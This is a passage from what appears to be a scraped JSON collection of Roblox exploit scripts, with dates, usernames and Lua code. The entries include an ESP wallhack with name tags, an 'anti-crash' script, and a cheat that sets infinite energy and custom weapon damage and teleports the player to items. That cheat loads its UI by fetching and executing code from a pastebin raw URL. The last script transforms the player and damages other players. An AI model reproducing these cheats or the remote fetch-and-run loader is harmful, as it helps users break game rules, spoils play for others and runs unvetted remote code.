nameTag:Destroy()\n            end\n        end\n    end\nend\n\n-- Criar o botão de ESP na tela\nlocal screenGui = Instance.new(\"ScreenGui\", game.CoreGui)\nlocal espButton = Instance.new(\"TextButton\", screenGui)\nespButton.Size = UDim2.new(0, 100, 0, 50)\nespButton.Position = UDim2.new(0, 10, 0, 10)\nespButton.Text = \"Ativar ESP\"\nespButton.BackgroundColor3 = Color3.fromRGB(0, 0, 255)\nespButton.TextColor3 = Color3.fromRGB(255, 255, 255)\nespButton.Font = Enum.Font.SourceSans\nespButton.TextSize = 18\nespButton.Draggable = true\n\n-- Função para alternar o estado do ESP\nlocal function toggleESP()\n    espEnabled = not espEnabled\n    if espEnabled then\n        espButton.Text = \"Desativar ESP\"\n        espButton.BackgroundColor3 = Color3.fromRGB(0, 0, 255)\n        updateVisuals()\n    else\n        espButton.Text = \"Ativar ESP\"\n        espButton.BackgroundColor3 = Color3.fromRGB(255, 0, 0)\n        clearVisuals()\n        if nameTagEnabled then updateVisuals() end\n    end\nend\n\nespButton.MouseButton1Click:Connect(toggleESP)\n\n-- Criar o botão de NameTag\nlocal nameTagButton = Instance.new(\"TextButton\", screenGui)\nnameTagButton.Size = UDim2.new(0, 100, 0, 50)\nnameTagButton.Position = UDim2.new(0, 120, 0, 10)\nnameTagButton.Text = \"Mostrar Nomes\"\nnameTagButton.BackgroundColor3 = Color3.fromRGB(0, 0, 255)\nnameTagButton.TextColor3 = Color3.fromRGB(255, 255, 255)\nnameTagButton.Font = Enum.Font.SourceSans\nnameTagButton.TextSize = 18\nnameTagButton.Draggable = true\n\n-- Função para alternar o estado do NameTag\nlocal function toggleNameTag()\n    nameTagEnabled = not nameTagEnabled\n    if nameTagEnabled then\n        nameTagButton.Text = \"Esconder Nomes\"\n        nameTagButton.BackgroundColor3 = Color3.fromRGB(0, 0, 255)\n        updateVisuals()\n    else\n        nameTagButton.Text = \"Mostrar Nomes\"\n        nameTagButton.BackgroundColor3 = Color3.fromRGB(255, 0, 0)\n        clearVisuals()\n        if espEnabled then updateVisuals() end\n    end\nend\n\nnameTagButton.MouseButton1Click:Connect(toggleNameTag)\n\n-- Botão para esconder/mostrar todos os botões\nlocal toggleButton = Instance.new(\"TextButton\", screenGui)\ntoggleButton.Size = UDim2.new(0, 50, 0, 50)\ntoggleButton.Position = UDim2.new(0, 230, 0, 10)\ntoggleButton.Text = \"X\"\ntoggleButton.BackgroundColor3 = Color3.fromRGB(255, 0, 0)\ntoggleButton.TextColor3 = Color3.fromRGB(255, 255, 255)\ntoggleButton.Font = Enum.Font.SourceSansBold\ntoggleButton.TextSize = 18\ntoggleButton.Draggable = true\n\n-- Função para ocultar/exibir os botões de ESP e NameTag\nlocal buttonsVisible = true\nlocal function toggleButtonsVisibility()\n    buttonsVisible = not buttonsVisible\n    espButton.Visible = buttonsVisible\n    nameTagButton.Visible = buttonsVisible\nend\n\ntoggleButton.MouseButton1Click:Connect(toggleButtonsVisibility)\n\n-- Atualização do ESP e NameTag a cada intervalo\nspawn(function()\n    while true do\n        if espEnabled or nameTagEnabled then\n            updateVisuals()\n        end\n        wait(updateInterval)\n    end\nend)\n\n-- Atualiza ao jogador entrar ou morrer\ngame.Players.PlayerAdded:Connect(updateVisuals)\ngame.Players.PlayerRemoving:Connect(updateVisuals)\ngame.Players.PlayerAdded:Connect(function(player)\n    player.CharacterAdded:Connect(function()\n        wait(1)\n        updateVisuals()\n    end)\nend)",
+      "Script_Title": "Hx esp - NAME Br -PT",
+      "User_ID": 7408087081,
+      "Username": "kit_cynALT"
+    },
+    "Script1197": {
+      "Date": "November 10 2024",
+      "Description": "سكربت FO نادر جدا يمنع lag يمنع kick يقوي صملتك",
+      "Script": "--[[\n  Script by فارس و تيم FO\n  سكربت مصمم لمنع الـ crash بأقصى قدر من الكفاءة والاقتصاد في استخدام الموارد\n--]]\n\n-- وظيفة لتحسين استخدام الذاكرة ومنع الـ crash\nlocal function optimizeMemory()\n    -- مراقبة إضافة اللاعبين\n    game:GetService(\"Players\").PlayerAdded:Connect(function(player)\n        -- مراقبة إضافة الشخصيات\n        player.CharacterAdded:Connect(function(character)\n            -- مراقبة إضافة الأجزاء\n            character.DescendantAdded:Connect(function(descendant)\n                if descendant:IsA(\"BasePart\") or descendant:IsA(\"MeshPart\") then\n                    -- تحرير الملكية الشبكية لتقليل الحمل على الشبكة\n                    descendant:SetNetworkOwner(nil)\n                end\n            end)\n        end)\n    end)\n\n    -- تنظيف الذاكرة بشكل دوري لتحسين الأداء\n    while true do\n        collectgarbage()  -- تجميع القمامة (تحرير الذاكرة غير المستخدمة)\n        wait(10)  -- الانتظار 10 ثواني بين كل عملية تنظيف لتقليل الضغط على الموارد\n    end\nend\n\n-- رسالة ترحيب لتأكيد أن السكربت يعمل\nlocal function showWelcomeMessage()\n    local ScreenGui = Instance.new(\"ScreenGui\")\n    local TextLabel = Instance.new(\"TextLabel\")\n    \n    ScreenGui.Parent = game.CoreGui\n    TextLabel.Parent = ScreenGui\n    TextLabel.Size = UDim2.new(0, 300, 0, 50)\n    TextLabel.Position = UDim2.new(0.5, -150, 0.1, 0)\n    TextLabel.BackgroundTransparency = 1\n    TextLabel.Text = \"منع الـ crash مفعل\"\n    TextLabel.TextColor3 = Color3.fromRGB(0, 255, 0)\n    TextLabel.Font = Enum.Font.SourceSansBold\n    TextLabel.TextScaled = true\n    \n    wait(3)  -- إظهار الرسالة لمدة 3 ثواني\n    ScreenGui:Destroy()\nend\n\n-- استدعاء وظيفة التأكيد\nshowWelcomeMessage()\n\n-- استدعاء وظيفة تحسين الذاكرة\noptimizeMemory()\n\n-- يمكن إضافة تحسينات إضافية هنا إذا لزم الأمر",
+      "Script_Title": "script FO",
+      "User_ID": 7403117644,
+      "Username": "98Q_X"
+    },
+    "Script1198": {
+      "Date": "November 09 2024",
+      "Description": "hi ",
+      "Script": "local Players = game:GetService(\"Players\")\nlocal player = Players.LocalPlayer\n \ngetgenv().inf_energy = false\ngetgenv().selected_item = nil\n \nlocal function getRoot(char)\n    local rootPart = char:FindFirstChild('HumanoidRootPart') or char:FindFirstChild('Torso') or char:FindFirstChild('UpperTorso')\n    return rootPart\nend\n \nlocal function set(type, bool)\n    if type == \"energy\" then\n        getgenv().inf_energy = bool\n        local char = player.Character\n        local energy_value = char.Energy\n        if getgenv().inf_energy == true then\n            energy_value.Value = 1000000\n        else\n            energy_value.Value = 70\n        end\n    end\nend\n \nlocal tools = {}\n \nlocal function refresh()\n    tools = {}\n    for i,v in pairs(game.Workspace.Pickups:GetChildren()) do\n        if table.find(tools, v.Name) then else\n            table.insert(tools, v.Name)\n        end\n    end\nend\nrefresh()\n \nlocal weapons = {}\n \nlocal function getWeapons(plyer)\n    weapons = {}\n    for i,v in pairs(plyer.Backpack:GetChildren()) do\n        if v.Name == \"Crowbar\" or v.Name == \"Bat\" then\n            if table.find(weapons, v.Name) then else\n                table.insert(weapons, v.Name)\n            end\n        end\n    end\nend\ngetWeapons(player)\n \nlocal ui = loadstring(game:HttpGet(\"https://pastebin.com/raw/3xXCHAQD\"))()\nui:Window(\"Ouxie / Gef\")\n \nlocal plr = ui:NewTab(\"Player\", \"0\")\nlocal items = ui:NewTab(\"Items\", \"0\")\n \nlocal dmg = 0\nlocal selected_weapon = nil\n \nplr:Button(\"refresh weapons\", \"Refreshes the weapon dropdown/updates it.\", function()\n    getWeapons(player)\nend)\n \nplr:Dropdown(\"Selected Weapon\", \"Selected Weapon to set damage.\", weapons, function()\n    for i,v in pairs(player.Backpack:GetChildren()) do\n        if v.Name == selected then\n            selected_weapon = v\n        end\n    end\n    for i,v in pairs(player.Character:GetChildren()) do\n        if v.Name == selected then\n            selected_weapon = v\n        end\n    end\nend)\n \nplr:Input(\"Damage\", \"Set the damage of the selected weapon.\", function()\n    dmg = tonumber(value)\nend)\n \nplr:Button(\"Set Damage\", \"Sets the damage of the selected weapon to the input amount of damage.\", function()\n    selected_weapon.Damage.Value = dmg\nend)\n \nplr:Toggle(\"Inf Energy\", \"Gives you an high amount of energy.\", function()\n    set(\"energy\", bool)\nend)\n \n \nitems:Button(\"Refresh\", \"Refresh the items.\", function()\n    refresh()\nend)\n \nitems:Dropdown(\"Choose An Item\", \"Choose an item to goto.\", tools, function()\n    getgenv().selected_item = selected\nend)\n \nitems:Button(\"Goto Item\", \"Teleport to the selected item\", function()\n    for i,v in pairs(game.Workspace.Pickups:GetChildren()) do\n        if v.Name == selected_item or v.Name == getgenv().selected_item then\n            local p = getRoot(player.Character)\n            p.CFrame = v.CFrame\n        end\n    end\nend)",
+      "Script_Title": "gef super op",
+      "User_ID": 4315248930,
+      "Username": "pietro31gab"
+    },
+    "Script1199": {
+      "Date": "November 10 2024",
+      "Description": "",
+      "Script": "\n",
+      "Script_Title": "pop it trading ",
+      "User_ID": 3485012107,
+      "Username": "JericGGMVPKill"
+    },
+    "Script1200": {
+      "Date": "November 09 2024",
+      "Description": "minecraft steve (fe?)",
+      "Script": "-- ORIGINAL CREATOR: Depr1\n--Fixed lags by stommmDev for toasters if the creator wants to shut down this script i will\n-- If this script isn't on pastebin or the user who uploaded this isn't called \"Delros12\"\n-- (and yes my pastebin account is Delros12) or the link is not https://pastebin.com/2NNDTLjL\n-- then this is not the original link of this script. \n\n-- The original link of the script gets edited constantly for updates, if you use the original\n-- link you will be able to enjoy the most recent updates of this script without changing to \n-- another link which contains updated script.\n\n-- Enjoy! :)\n\n-- Controls: Q to sneak, use the keypad numbers 1-9 to change blocks, choose a empty slot i\n-- you want to remove a block.\n\n-- this script will transform you into steve when used\n\nlocal targetName = game.Players.LocalPlayer.Name\nlocal player = game.Players:FindFirstChild(targetName)\nfunction putTexture(part, frontF, backF, topF, bottomF, leftF, rightF, className)\n\tlocal faces = {\"Front\", \"Back\", \"Top\", \"Bottom\", \"Left\", \"Right\"}\n\tfor i,f in pairs(faces) do\n\t\tlocal decal = Instance.new(className, part)\n\t\tif i == 1 then decal.Texture = frontF decal.Name = f end\n\t\tif i == 2 then decal.Texture = backF or frontF decal.Name = f  end\n\t\tif i == 3 then decal.Texture = topF or frontF decal.Name = f  end\n\t\tif i == 4 then decal.Texture = bottomF or frontF decal.Name = f end\n\t\tif i == 5 then decal.Texture = leftF or frontF decal.Name = f  end\n\t\tif i == 6 then decal.Texture = rightF or frontF decal.Name = f  end\n\t\tdecal.Face = f\n\tend\n\treturn part\nend\nfunction makeSquare(position, size, color, transparency, parent)\n\tlocal label = Instance.new(\"TextLabel\", parent)\n\tlabel.Text = \"\"\n\tlabel.BorderSizePixel = 0\n\tlabel.BackgroundTransparency = transparency\n\tlabel.Position = position\n\tlabel.Size = size\n\tlabel.BackgroundColor3 = color\nend\nfunction putToolBarSlot(position, image)\n\tlocal playerGui = player:FindFirstChild(\"PlayerGui\")\n\tif playerGui then\n\t\tlocal gui = playerGui:FindFirstChild(\"ToolBar\") or Instance.new(\"ScreenGui\", playerGui)\n\t\tgui.Name = \"ToolBar\"\n\t\tlocal slot = Instance.new(\"ImageLabel\", gui)\n\t\tslot.Position = position\n\t\tslot.Size = UDim2.new(0, 32, 0, 32)\n\t\tslot.BackgroundTransparency = 1\n\t\tslot.ImageTransparency = 0\n\t\tslot.Image = image\n\t\tslot.ZIndex = 2\n\t\t\n\t\tmakeSquare(UDim2.new(0, 0, 0, 0), UDim2.new(0, 32, 0, 32), \n\t\t\tColor3.new(95/255, 89/255, 76/255), 0, slot)\n\t\tmakeSquare(UDim2.new(0, 0, 0, 0), UDim2.new(0, 2, 0, 32), \n\t\t\tColor3.new(0/255, 0/255, 0/255), 0.5, slot)\n\t\tmakeSquare(UDim2.new(0, 2, 0, 0), UDim2.new(0, 30, 0, 2), \n\t\t\tColor3.new(0/255, 0/255, 0/255), 0.5, slot)\n\t\tmakeSquare(UDim2.new(0, -2, 0, -2), UDim2.new(0, 36, 0, 2), \n\t\t\tColor3.new(106/255, 106/255, 106/255), 0, slot)\n\t\tmakeSquare(UDim2.new(0, -2, 0, -2), UDim2.new(0, 2, 0, 36), \n\t\t\tColor3.new(106/255, 106/255, 106/255), 0, slot)\n\t\tmakeSquare(UDim2.new(0, 0, 0, 32), UDim2.new(0, 34, 0, 2), \n\t\t\tColor3.new(130/255, 130/255, 130/255), 0, slot)\n\t\tmakeSquare(UDim2.new(0, 32, 0, 0), UDim2.new(0, 2, 0, 34), \n\t\t\tColor3.new(130/255, 130/255, 130/255), 0, slot)\n\t\tmakeSquare(UDim2.new(0, -4, 0, -2), UDim2.new(0, 2, 0, 38), \n\t\t\tColor3.new(130/255, 130/255, 130/255), 0, slot)\n\t\tmakeSquare(UDim2.new(0, 34, 0, -2), UDim2.new(0, 2, 0, 36), \n\t\t\tColor3.new(106/255, 106/255, 106/255), 0, slot)\n\t\tmakeSquare(UDim2.new(0, -2, 0, 34), UDim2.new(0, 38, 0, 2), \n\t\t\tColor3.new(106/255, 106/255, 106/255), 0, slot)\n\t\tmakeSquare(UDim2.new(0, -4, 0, -4), UDim2.new(0, 40, 0, 2), \n\t\t\tColor3.new(156/255, 156/255, 156/255), 0, slot)\n\tend\nend\nfunction divide(x, d)\n\tif x ~= 0 and d ~= 0 then\n\t\treturn x/d\n\telse\n\t\treturn x\n\tend\nend -- so it doesn't divide by zero\nfunction getDistance(v1, v2)\n\treturn math.abs((Vector3.new(math.abs(v2.X - v1.X), math.abs(v2.Y - v1.Y), math.abs(v2.Z - v1.Z))).Magnitude)\nend\nfunction round(x)\n  \tif x%2 ~= 0.5 then\n    \treturn math.floor(x+0.5)\n  \tend\n  \treturn x-0.5\nend\nfunction weldTo(part1, part2)\n\tlocal weld = Instance.new(\"Weld\", part1)\n\tweld.Part0 = part1\n\tweld.Part1 = part2\nend\nfunction getMagnitudeXZ(velocity)\n\treturn math.abs(velocity.X) + math.abs(velocity.Z)\nend\nfunction placeBlock(block, cFPos)\n\tlocal blockPlaced = Instance.new(\"Part\", workspace)\n\tblockPlaced.Material = \"Fabric\"\n\tblockPlaced.Anchored = true\n\tblockPlaced.Size = block.size\n\tblockPlaced.CFrame = cFPos\n\tputTexture(blockPlaced, block.frontTex, block.backTex, \n\t\tblock.topTex, block.bottomTex, block.leftTex, block.rightTex, \"Texture\")\n\treturn blockPlaced\nend\nlocal toolBar = {\n\tDirt = {\n\t\tsize = Vector3.new(2.6, 2.6, 2.6),\n\t\tfrontTex = \"rbxassetid://179655033\",\n\t\tbackTex = \"rbxassetid://179655033\",\n\t\ttopTex = \"rbxassetid://179655033\",\n\t\tbottomTex = \"rbxassetid://179655033\",\n\t\tleftTex = \"rbxassetid://179655033\",\n\t\trightTex = \"rbxassetid://179655033\"\n\t},\n\tGrass = {\n\t\tsize = Vector3.new(2.6, 2.6, 2.6),\n\t\tfrontTex = \"rbxassetid://96430337\",\n\t\tbackTex = \"rbxassetid://96430337\",\n\t\ttopTex = \"rbxassetid://96430265\",\n\t\tbottomTex = \"rbxassetid://179655033\",\n\t\tleftTex = \"rbxassetid://96430337\",\n\t\trightTex = \"rbxassetid://96430337\"\n\t},\n\tStone = {\n\t\tsize = Vector3.new(2.6, 2.6, 2.6),\n\t\tfrontTex = \"rbxassetid://75880927\",\n\t\tbackTex = \"rbxassetid://75880927\",\n\t\ttopTex = \"rbxassetid://75880927\",\n\t\tbottomTex = \"rbxassetid://75880927\",\n\t\tleftTex = \"rbxassetid://75880927\",\n\t\trightTex = \"rbxassetid://75880927\"\n\t},\n\tDiamond_Ore = {\n\t\tsize = Vector3.new(2.6, 2.6, 2.6),\n\t\tfrontTex = \"rbxassetid://57928490\",\n\t\tbackTex = \"rbxassetid://57928490\",\n\t\ttopTex = \"rbxassetid://57928490\",\n\t\tbottomTex = \"rbxassetid://57928490\",\n\t\tleftTex = \"rbxassetid://57928490\",\n\t\trightTex = \"rbxassetid://57928490\"\n\t},\n\tDiamond_Block = {\n\t\tsize = Vector3.new(2.6, 2.6, 2.6),\n\t\tfrontTex = \"rbxassetid://56749955\",\n\t\tbackTex = \"rbxassetid://56749955\",\n\t\ttopTex = \"rbxassetid://56749955\",\n\t\tbottomTex = \"rbxassetid://56749955\",\n\t\tleftTex = \"rbxassetid://56749955\",\n\t\trightTex = \"rbxassetid://56749955\"\n\t},\n\tWood_Planks = {\n\t\tsize = Vector3.new(2.6, 2.6, 2.6),\n\t\tfrontTex = \"rbxassetid://346201871\",\n\t\tbackTex = \"rbxassetid://346201871\",\n\t\ttopTex = \"rbxassetid://346201871\",\n\t\tbottomTex = \"rbxassetid://346201871\",\n\t\tleftTex = \"rbxassetid://346201871\",\n\t\trightTex = \"rbxassetid://346201871\"\n\t},\n\tOak_Log = {\n\t\tsize = Vector3.new(2.6, 2.6, 2.6),\n\t\tfrontTex = \"rbxassetid://310831812\",\n\t\tbackTex = \"rbxassetid://310831812\",\n\t\ttopTex = \"rbxassetid://152538557\",\n\t\tbottomTex = \"rbxassetid://152538557\",\n\t\tleftTex = \"rbxassetid://310831812\",\n\t\trightTex = \"rbxassetid://310831812\"\n\t}\n}\nif player then\n\tlocal char = player.Character\n\tif char then\n\t\tfor _,cM in pairs(char:GetChildren()) do\n\t\t\tif cM.ClassName == \"CharacterMesh\" then cM:Destroy() end\n\t\tend\n\t\t\n\t\t--[]\n\t\tlocal gui = player.PlayerGui:FindFirstChild(\"ToolBar\") or Instance.new(\"ScreenGui\", player.PlayerGui)\n\t\tgui.Name = \"ToolBar\"\n\t\t\n\t\tmakeSquare(UDim2.new(0.5, -166, 1, -111), UDim2.new(0, 364, 0, 44), \n\t\t\tColor3.new(0/255, 0/255, 0/255), 0, gui)\n\t\t\n\t\tlocal blocks = {\"Dirt\", \"Grass\", \"Stone\", \"Diamond_Ore\", \"Diamond_Block\", \"Wood_Planks\", \"Oak_Log\"}\n\t\tfor i = 1, 9 do\n\t\t\tif toolBar[blocks[i]] ~= nil then\n\t\t\t\tputToolBarSlot(UDim2.new(0.5, -160 + ((i-1)*40), 1, -105), toolBar[blocks[i]].frontTex)\n\t\t\telse\n\t\t\t\tputToolBarSlot(UDim2.new(0.5, -160 + ((i-1)*40), 1, -105), \"\")\t\t\t\t\n\t\t\tend\n\t\tend\t\n\t\t\n\t\tlocal humRootPart = char:WaitForChild(\"HumanoidRootPart\")\n\t\tlocal head = char:WaitForChild(\"Head\")\n\t\tlocal torso = char:WaitForChild(\"Torso\")\n\t\tlocal lArm = char:WaitForChild(\"Left Arm\")\n\t\tlocal rArm = char:WaitForChild(\"Right Arm\")\n\t\tlocal lLeg = char:WaitForChild(\"Left Leg\")\n\t\tlocal rLeg = char:WaitForChild(\"Right Leg\")\n\t\t\n\t\thead.Size = Vector3.new(1.3, 1.3, 1.3)\n\t\tputTexture(head, \"rbxassetid://38738031\", \"rbxassetid://36047330\", \n\t\t\t\"rbxassetid://36047341\", \"rbxassetid://36047347\",\n\t\t\t\"rbxassetid://36047323\", \"rbxassetid://36047315\", \"Decal\")\n\t\thead:WaitForChild(\"Mesh\"):Destroy()\n\t\thead:WaitForChild(\"face\"):Destroy()\n\t\t\n\t\ttorso.Size = Vector3.new(1.3, 1.95, 0.65)\n\t\tputTexture(torso, \"rbxassetid://38934753\", \"rbxassetid://38934731\", \n\t\t\t\"rbxassetid://38934780\", \"rbxassetid://38934740\",\n\t\t\t\"rbxassetid://38934762\", \"rbxassetid://38934762\", \"Decal\")\n\t\t\n\t\tlArm.Size = Vector3.new(0.65, 1.95, 0.65)\n\t\tputTexture(lArm, \"rbxassetid://38934581\", \"rbxassetid://38934560\", \n\t\t\t\"rbxassetid://38934613\", \"rbxassetid://38934568\",\n\t\t\t\"rbxassetid://38934601\", \"rbxassetid://38934591\", \"Decal\")\n\t\t\n\t\trArm.Size = Vector3.new(0.65, 1.95, 0.65)\n\t\tputTexture(rArm, \"rbxassetid://38934560\", \"rbxassetid://38934581\", \n\t\t\t\"rbxassetid://38934613\", \"rbxassetid://38934568\",\n\t\t\t\"rbxassetid://38934601\", \"rbxassetid://38934591\", \"Decal\")\n\t\t\n\t\tlLeg.Size = Vector3.new(0.65, 1.95, 0.65)\n\t\tputTexture(lLeg, \"rbxassetid://38936226\", \"rbxassetid://38936209\", \n\t\t\t\"rbxassetid://38934719\", \"rbxassetid://38934712\",\n\t\t\t\"rbxassetid://38936255\", \"rbxassetid://38936242\", \"Decal\")\n\t\t\n\t\trLeg.Size = Vector3.new(0.65, 1.95, 0.65)\n\t\tputTexture(rLeg, \"rbxassetid://38936209\", \"rbxassetid://38936226\", \n\t\t\t\"rbxassetid://38934719\", \"rbxassetid://38934712\",\n\t\t\t\"rbxassetid://38936242\", \"rbxassetid://38936255\", \"Decal\")\n\t\t\n\t\tchar.Humanoid:ClearAllChildren()\n\t\tchar.Animate:Remove()\t\t\n\t\t\n\t\t-- now for the real stuff\n\t\t-- |\n\t\t-- |\n\t\t-- V\n\t\tInstance.new(\"BlockMesh\", torso)\n\t\tInstance.new(\"BlockMesh\", lArm)\n\t\tInstance.new(\"BlockMesh\", rArm)\n\t\tInstance.new(\"BlockMesh\", lLeg)\n\t\tInstance.new(\"BlockMesh\", rLeg)\n\t\t\n\t\tlocal camera = workspace.Camera\n\t\tlocal camPart = Instance.new(\"Part\", camera)\n\t\tcamPart.Size = Vector3.new(0, 0, 0)\n\t\tcamPart.CFrame = camera.CFrame\n\t\tcamPart.Transparency = 1\n\t\t\n\t\t--[[local cameraHand = Instance.new(\"Part\", camera)\n\t\tcameraHand.Size = Vector3.new(0.65, 1.95, 0.65)\n\t\tcameraHand.CanCollide = false\n\t\tcameraHand.Anchored = true\n\t\tcameraHand.Name = \"CameraHand\"\n\t\tputTexture(cameraHand, \"rbxassetid://38934560\", \"rbxassetid://38934581\", \n\t\t\t\"rbxassetid://38934613\", \"rbxassetid://38934568\",\n\t\t\t\"rbxassetid://38934601\", \"rbxassetid://38934591\", \"Decal\")\n\t\t\n\t\tlocal cameraHandWeld = Instance.new(\"Motor6D\", camPart)\n\t\tcameraHandWeld.Part0 = camPart\n\t\tcameraHandWeld.Part1 = cameraHand\n\t\tcameraHandWeld.C0 = CFrame.new(5, 0, 0)\n\t\t]]--\n\t\t\n\t\tlocal humanoid = char:WaitForChild(\"Humanoid\")\t\n\t\thumanoid.HipHeight = 0.3\t\n\n\t\tlocal rootJoint = Instance.new(\"Motor6D\", torso)\n\t\trootJoint.Name = \"RootJoint\"\n\t\trootJoint.Part0 = humRootPart\n\t\trootJoint.Part1 = torso\n\t\trootJoint.C1 = CFrame.new(0, 0.05, 0)\n\t\t\n\t\tlocal neck = Instance.new(\"Motor6D\", torso)\n\t\tneck.Name = \"Neck\"\n\t\tneck.Part0 = head\n\t\tneck.Part1 = torso\n\t\t\n\t\tlocal lS = Instance.new(\"Motor6D\", torso)\n\t\tlS.Name = \"Left Shoulder\"\n\t\tlS.Part0 = lArm\n\t\tlS.Part1 = torso\n\t\tlS.C0 = CFrame.new(-0.325, 0.975, 0) * CFrame.Angles(0, 0, 0)\n\t\tlS.C1 = CFrame.new(0.65, 0.975, 0)\n\n\t\tlocal rS = Instance.new(\"Motor6D\", torso)\n\t\trS.Name = \"Right Shoulder\"\n\t\trS.Part0 = rArm\n\t\trS.Part1 = torso\n\t\trS.C0 = CFrame.new(-0.325, 0.975, 0) * CFrame.Angles(0, 0, 0)\n\t\trS.C1 = CFrame.new(-0.65, 0.975, 0) * CFrame.Angles(0, -math.rad(180), 0)\n\n\t\tlocal lH = Instance.new(\"Motor6D\", torso)\n\t\tlH.Name = \"Left Hip\"\n\t\tlH.Part0 = lLeg\n\t\tlH.Part1 = torso\n\t\tlH.C0 = CFrame.new(0, 0.975, 0)\n\t\tlH.C1 = CFrame.new(0.325, -0.975, 0) * CFrame.Angles(0, 0, 0)\n\n\t\tlocal rH = Instance.new(\"Motor6D\", torso)\n\t\trH.Name = \"Right Hip\"\n\t\trH.Part0 = rLeg\n\t\trH.Part1 = torso\n\t\trH.C0 = CFrame.new(0, 0.975, 0)\n\t\trH.C1 = CFrame.new(-0.325, -0.975, 0) * CFrame.Angles(0, -math.rad(180), 0)\n\t\t\n\t\tfor _,p in pairs(char:GetChildren()) do\n\t\t\tif p.Name ~= \"HumanoidRootPart\" and p.ClassName == \"Part\" then\n\t\t\t\tlocal hit = Instance.new(\"Part\", char)\n\t\t\t\thit.Name = \"DamagePart\"\n\t\t\t\thit.BrickColor = BrickColor.new(\"Bright red\")\n\t\t\t\thit.Material = \"SmoothPlastic\"\n\t\t\t\thit.Transparency = 1\n\t\t\t\thit.Size = Vector3.new(p.Size.X + 0.05, p.Size.Y + 0.05, p.Size.Z + 0.05)\n\t\t\t\thit.CanCollide = false\n\t\t\t\tweldTo(hit, p)\n\t\t\tend\n\t\tend\n\t\t\n\t\tlocal ticks = 0\n\t\tlocal times = 0\n\t\t\n\t\tlocal walkAnim = 0\n\t\tlocal increaseWalkAnim = 1\n\t\t\n\t\tlocal idleAnimRotX = 0\n\t\tlocal idleAnimRotZ = 0\n\t\tlocal sneaking = 0\n\t\t\n\t\tlocal RS = game:GetService(\"RunService\").RenderStepped\n\t\tlocal Mouse = player:GetMouse()\t\t\n\t\t\n\t\tlocal oldHP = humanoid.Health\n\t\tlocal damageTime = 0\n\t\t\n\t\tlocal punchRotX = 0\n\t\tlocal punchRotY = 0\n\t\tlocal punchRotZ = 0\t\t\t\n\t\tlocal punchSpeed = 0\n\t\tlocal punching = 0\n\t\tlocal selectedBlock = 8\n\t\tlocal punchEnded = 1\n\t\tlocal itemOnHand = nil\n\t\t\n\t\tlocal handItem = Instance.new(\"Part\", char)\n\t\thandItem.Name = \"HandItem\"\n\t\thandItem.Size = Vector3.new(0.52, 0.52, 0.52)\n\t\thandItem.Transparency = 1\t\n\t\thandItem.CanCollide = false\n\t\t\n\t\tlocal handItemWeld = Instance.new(\"Weld\", char)\n\t\thandItemWeld.Part0 = handItem\n\t\thandItemWeld.Part1 = lArm\n\t\thandItemWeld.C1 = CFrame.new(0, -0.9, -0.6) * CFrame.Angles(math.rad(-10), math.rad(45), 0)\t\n\t\t\n\t\tlocal sound = Instance.new(\"Sound\", char)\n\t\tsound.Name = \"Hurt\"\n\t\tsound.Volume = 10\n\t\tsound.SoundId = \"rbxassetid://535690488\"\t\t\n\t\t\n\t\tlocal facesToResize = {\"Front\", \"Back\", \"Left\", \"Right\", \"Bottom\", \"Top\"}\n\t\tMouse.Button1Down:connect(function()\n\t\t\tif punchEnded == 1 then punching = 1 end\n\t\t\tif Mouse.Target then\n\t\t\t\tif getDistance(head.CFrame.p, Mouse.Hit.p) <= 10.4 then\n\t\t\t\t\tlocal humanoid = Mouse.Target.Parent:FindFirstChild(\"Humanoid\")\n\t\t\t\t\tif humanoid then\n\t\t\t\t\t\thumanoid.Health = humanoid.Health - 10\n\t\t\t\t\t\tlocal parts = Mouse.Target.Parent:GetChildren()\n\t\t\t\t\t\tfor _,p in pairs(parts) do\n\t\t\t\t\t\t\tif p.ClassName == \"Part\" then\n\t\t\t\t\t\t\t\tp.Velocity = Vector3.new(p.Velocity.X + (head.CFrame.lookVector.X * 18), p.Velocity.Y + (head.CFrame.lookVector.Y * 18) + 8, p.Velocity.Z + (head.CFrame.lookVector.Z * 18))\n\t\t\t\t\t\t\tend\n\t\t\t\t\t\tend\n\t\t\t\t\t\treturn\n\t\t\t\t\tend\n\t\t\t\t\tlocal x = Mouse.Target.CFrame.p.X\n\t\t\t\t\tlocal y = Mouse.Target.CFrame.p.Y\n\t\t\t\t\tlocal z = Mouse.Target.CFrame.p.Z\n\t\t\t\t\tif Mouse.TargetSurface.Name == \"Right\" then x = x + 2.6 end\n\t\t\t\t\tif Mouse.TargetSurface.Name == \"Left\" then x = x - 2.6 end\n\t\t\t\t\tif Mouse.TargetSurface.Name == \"Top\" then y = y + 2.6 end\n\t\t\t\t\tif Mouse.TargetSurface.Name == \"Bottom\" then y = y - 2.6 end\n\t\t\t\t\tif Mouse.TargetSurface.Name == \"Back\" then z = z + 2.6 end\n\t\t\t\t\tif Mouse.TargetSurface.Name == \"Front\" then z = z - 2.6 end\n\t\t\t\t\tif Mouse.Target.Size.X > 2.6 or Mouse.Target.Size.Y > 2.6 or Mouse.Target.Size.Z > 2.6 then\n\t\t\t\t\t\tx = Mouse.Hit.p.X\n\t\t\t\t\t\ty = Mouse.Hit.p.Y\n\t\t\t\t\t\tz = Mouse.Hit.p.Z\n\t\t\t\t\tend\n\t--\t\t\t\tlocal x = round(math.abs(mouseX)/2.6)*2.6\n\t--\t\t\t\tlocal y = round(math.abs(mouseY)/2.6)*2.6\n\t--\t\t\t\tlocal z = round(math.abs(mouseZ)/2.6)*2.6\n\t--\t\t\t\tif Mouse.Hit.p.X < 0 then x = x * -1 end\n\t--\t\t\t\tif Mouse.Hit.p.Y < 0 then y = y * -1 end\n\t--\t\t\t\tif Mouse.Hit.p.Z < 0 then z = z * -1 end\n\t\t\t\t\tif selectedBlock == 0 then\n\t\t\t\t\t\tlocal blk = placeBlock(toolBar.Dirt, CFrame.new(x, y, z))\n\t\t\t\t\t\tfor _,f in pairs(facesToResize) do\n\t\t\t\t\t\t\tblk:WaitForChild(f).StudsPerTileU = 2.6\n\t\t\t\t\t\t\tblk:WaitForChild(f).StudsPerTileV = 2.6\n\t\t\t\t\t\tend\n\t\t\t\t\telseif selectedBlock == 1 then\n\t\t\t\t\t\tlocal blk = placeBlock(toolBar.Grass, CFrame.new(x, y, z))\n\t\t\t\t\t\tfor _,f in pairs(facesToResize) do\n\t\t\t\t\t\t\tblk:WaitForChild(f).StudsPerTileU = 2.6\n\t\t\t\t\t\t\tblk:WaitForChild(f).StudsPerTileV = 2.6\n\t\t\t\t\t\tend\n\t\t\t\t\telseif selectedBlock == 2 then\n\t\t\t\t\t\tlocal blk = placeBlock(toolBar.Stone, CFrame.new(x, 